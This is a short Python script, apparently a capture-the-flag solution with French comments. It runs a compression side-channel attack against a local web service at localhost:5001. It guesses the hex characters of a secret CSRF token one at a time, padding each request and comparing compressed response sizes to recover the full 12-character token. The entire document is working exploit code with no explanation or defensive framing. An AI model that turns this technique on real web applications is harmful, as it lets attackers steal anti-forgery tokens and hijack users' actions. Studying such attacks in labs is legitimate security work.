import requests
from collections import deque
import random

url = "http://localhost:5001/"

q = deque([""]) # Empty string de base

def break_huffman(current_payload, new_char):
	for tries in range(10):
		padding = "{}"*random.randint(4, 100)

		response = requests.post(url, data={"research":f"secret?username=csrf_token={current_payload + new_char + padding}"})
		size_a = int(response.text)

		#Two tries
		response = requests.post(url, data={"research":f"secret?username=csrf_token={ current_payload + padding + new_char}"})
		size_b = int(response.text)

		if size_a < size_b:
			return True
	return False

while len(q) > 0:
	current_payload = q.popleft()
	if len(current_payload) == 12:
		print("WOAW CSRF = ", current_payload)
		break

	for i in range(16):
		new_char = f"{i:x}"

		# On regarde si il a le mérite d'aller dans la queue si non bas dommage pour lui :(
		if not break_huffman(current_payload, new_char):
			continue

		q.append(current_payload+new_char)
		print(current_payload+new_char, "ok")

